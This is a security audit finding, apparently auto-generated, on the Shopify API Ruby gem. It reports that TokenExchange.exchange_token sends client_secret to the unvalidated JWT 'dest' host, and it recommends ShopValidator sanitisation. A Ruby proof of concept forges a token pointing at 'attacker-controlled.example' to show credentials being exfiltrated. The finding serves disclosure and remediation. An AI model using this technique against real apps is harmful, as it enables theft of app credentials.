Confirmed: `Clients::HttpClient#initialize` builds `@base_uri = "https://#{api_host || session.shop}"` directly from `session.shop`, with no re-validation at the HTTP layer [1](#0-0) . This means whatever string is stored as `Auth::Session#shop` becomes the exact host that receives the POST body containing `client_id`, `client_secret`, and the authorization `code`/`subject_token` during the OAuth code exchange or token-exchange flow.

### Title
Unvalidated `dest` claim in Token Exchange sends `client_secret` to attacker-influenced host - (File: lib/shopify_api/auth/token_exchange.rb)

### Summary
`ShopifyAPI::Auth::TokenExchange.exchange_token` derives the destination shop directly from the `dest` claim of the caller-supplied session token, without ever passing it through `Utils::ShopValidator.sanitize!`, unlike every sibling method in the same file and module family.

### Finding Description
`exchange_token` decodes the session token with `JwtPayload.new(session_token)` and takes `dest_shop = jwt_payload.shop`, which is simply `@dest.gsub("https://", "")` with no domain allow-list check [2](#0-1) . It then builds `shop_session = ShopifyAPI::Auth::Session.new(shop: dest_shop)` and passes it to `Clients::HttpClient.new(session: shop_session, base_path: "/admin/oauth")`, which will POST the app's `client_secret` and the raw `session_token` (`subject_token`) to `https://#{dest_shop}/admin/oauth/access_token` [3](#0-2) .

This is the exact analog class requested: the field acted on (the destination host that receives `client_secret`) is not the field bound by the identity check. `JwtPayload` only verifies (a) the HMAC signature against `Context.api_secret_key`/`old_api_secret_key` and (b) that `aud == Context.api_key` [4](#0-3) . It never checks that `dest`/`iss` is a trusted `*.myshopify.com`/`myshopify.io`/`spin.dev`/etc. domain the way `Utils::ShopValidator` does elsewhere.

Every other credential-sending method in this module validates the shop first: `client_credentials.rb` calls `Utils::ShopValidator.sanitize!(shop)` before building the session [5](#0-4) , as does `refresh_token.rb` [6](#0-5) , and `TokenExchange.migrate_to_expiring_token` in the very same file [7](#0-6) . Only `exchange_token` (and `Oauth.validate_auth_callback`, which is protected by HMAC on the whole query string instead) skip this step [8](#0-7) .

Because `HttpClient` builds its base URI as `"https://#{api_host || session.shop}"` with no further sanitization [1](#0-0) , any value smuggled into the token's `dest` claim becomes the literal request host.

### Impact Explanation
If an attacker can obtain any validly-signed session token whose `dest` is not host-restricted to a myshopify domain (for example, a token issued for a different, non-admin surface such as a checkout/UI-extension context — note the codebase's own test fixtures show `dest` values without the `/admin` suffix and without myshopify validation, e.g. `@checkout_ui_extension_jwt_payload` [9](#0-8) ), calling `exchange_token` with it causes this gem to POST the app's `client_secret` to a host taken from that unchecked claim. This is SSRF carrying the app's credentials (`client_secret`) and the session token itself to a host that was never validated as belonging to Shopify — matching the "High: SSRF with the app's credentials" impact category.

### Likelihood Explanation
Exploitability depends on whether an unprivileged party can influence or obtain a signed token whose `dest` claim is not itself already constrained to a myshopify domain by Shopify's token issuance process. This is a genuine gap relative to the gem's own established pattern (every sibling method validates the shop domain), and it is not something that requires the app's `client_secret` to already be known to the attacker — it only requires a validly-signed token with an untrusted `dest`, which is a materially weaker precondition than the excluded "already has the secret" scenarios. I could not fully confirm from this repository alone whether Shopify's session-token issuance for all supported surfaces (checkout UI extensions, POS, etc.) guarantees `dest` is always a `myshopify.com` host; that guarantee lives outside this gem. Given the uncertainty, likelihood is assessed as **Low-Medium** — this is best understood as a missing defense-in-depth check that is inconsistent with the rest of the codebase, rather than a fully proven exploit chain traceable end-to-end within this gem alone.

### Recommendation
In `ShopifyAPI::Auth::TokenExchange.exchange_token`, validate `dest_shop` with `Utils::ShopValidator.sanitize!(dest_shop)` before constructing `shop_session`, mirroring `migrate_to_expiring_token`, `refresh_token.rb`, and `client_credentials.rb`. More generally, consider having `Auth::JwtPayload#shop`/`#dest` itself enforce membership in `Utils::ShopValidator::TRUSTED_SHOPIFY_DOMAINS` (plus any configured `myshopify_domain`) at decode time, so every caller gets this guarantee automatically instead of relying on each call site to remember to sanitize.

### Proof of Concept
```ruby
# Attacker obtains/crafts (or is issued) a session token whose `dest` claim
# is not restricted to a myshopify.com host, but which still passes JwtPayload's
# checks (valid signature under api_secret_key, aud == api_key):
payload = {
  iss: "https://attacker-controlled.example/admin",
  dest: "https://attacker-controlled.example",
  aud: ShopifyAPI::Context.api_key,
  sub: "gid://shopify/Customer/1",
  exp: (Time.now + 10).to_i,
  nbf: Time.now.to_i,
  iat: Time.now.to_i,
  jti: "1",
}
token = JWT.encode(payload, ShopifyAPI::Context.api_secret_key, "HS256")

# exchange_token never validates `dest_shop` via ShopValidator:
ShopifyAPI::Auth::TokenExchange.exchange_token(
  session_token: token,
  requested_token_type: ShopifyAPI::Auth::TokenExchange::RequestedTokenType::ONLINE_ACCESS_TOKEN,
)
# => Clients::HttpClient posts { client_id, client_secret, subject_token, ... }
#    to "https://attacker-controlled.example/admin/oauth/access_token"
```

### Citations

**File:** lib/shopify_api/clients/http_client.rb (L16-19)
```ruby
        api_host = Context.api_host

        @base_uri = T.let("https://#{api_host || session.shop}", String)
        @base_uri_and_path = T.let("#{@base_uri}#{base_path}", String)
```

**File:** lib/shopify_api/auth/jwt_payload.rb (L43-45)
```ruby
        raise ShopifyAPI::Errors::InvalidJwtTokenError,
          "Session token had invalid API key" unless @aud == Context.api_key
      end
```

**File:** lib/shopify_api/auth/jwt_payload.rb (L47-50)
```ruby
      sig { returns(String) }
      def shop
        @dest.gsub("https://", "")
      end
```

**File:** lib/shopify_api/auth/token_exchange.rb (L40-65)
```ruby
          jwt_payload = ShopifyAPI::Auth::JwtPayload.new(session_token)
          dest_shop = jwt_payload.shop

          if shop
            ShopifyAPI::Logger.deprecated(
              "The `shop` parameter for `exchange_token` is deprecated and will be removed in v17. " \
                "The shop is now always taken from the session token's `dest` claim.",
              "17.0.0",
            )
          end

          shop_session = ShopifyAPI::Auth::Session.new(shop: dest_shop)
          body = {
            client_id: ShopifyAPI::Context.api_key,
            client_secret: ShopifyAPI::Context.api_secret_key,
            grant_type: TOKEN_EXCHANGE_GRANT_TYPE,
            subject_token: session_token,
            subject_token_type: ID_TOKEN_TYPE,
            requested_token_type: requested_token_type.serialize,
          }

          if requested_token_type == RequestedTokenType::OFFLINE_ACCESS_TOKEN
            body.merge!({ expiring: ShopifyAPI::Context.expiring_offline_access_tokens ? 1 : 0 })
          end

          client = Clients::HttpClient.new(session: shop_session, base_path: "/admin/oauth")
```

**File:** lib/shopify_api/auth/token_exchange.rb (L103-104)
```ruby
          validated_shop = Utils::ShopValidator.sanitize!(shop)
          shop_session = ShopifyAPI::Auth::Session.new(shop: validated_shop)
```

**File:** lib/shopify_api/auth/client_credentials.rb (L25-26)
```ruby
          validated_shop = Utils::ShopValidator.sanitize!(shop)
          shop_session = ShopifyAPI::Auth::Session.new(shop: validated_shop)
```

**File:** lib/shopify_api/auth/refresh_token.rb (L24-25)
```ruby
          validated_shop = Utils::ShopValidator.sanitize!(shop)
          shop_session = ShopifyAPI::Auth::Session.new(shop: validated_shop)
```

**File:** lib/shopify_api/auth/oauth.rb (L60-73)
```ruby
        def validate_auth_callback(cookies:, auth_query:)
          unless Context.setup?
            raise Errors::ContextNotSetupError, "ShopifyAPI::Context not setup, please call ShopifyAPI::Context.setup"
          end
          raise Errors::InvalidOauthError, "Invalid OAuth callback." unless Utils::HmacValidator.validate(auth_query)
          raise Errors::UnsupportedOauthError, "Cannot perform OAuth for private apps." if Context.private?

          state = cookies[SessionCookie::SESSION_COOKIE_NAME]
          raise Errors::NoSessionCookieError unless state

          raise Errors::InvalidOauthError,
            "Invalid state in OAuth callback." unless state == auth_query.state

          null_session = Auth::Session.new(shop: auth_query.shop)
```

**File:** test/auth/jwt_payload_test.rb (L23-32)
```ruby
        @checkout_ui_extension_jwt_payload = {
          iss: "https://test-shop.myshopify.io/checkouts",
          dest: "test-shop.myshopify.io",
          aud: ShopifyAPI::Context.api_key,
          sub: "gid://shopify/Customer/123456789",
          exp: (Time.now + 10).to_i,
          nbf: 1234,
          iat: 1234,
          jti: "4321",
        }
```
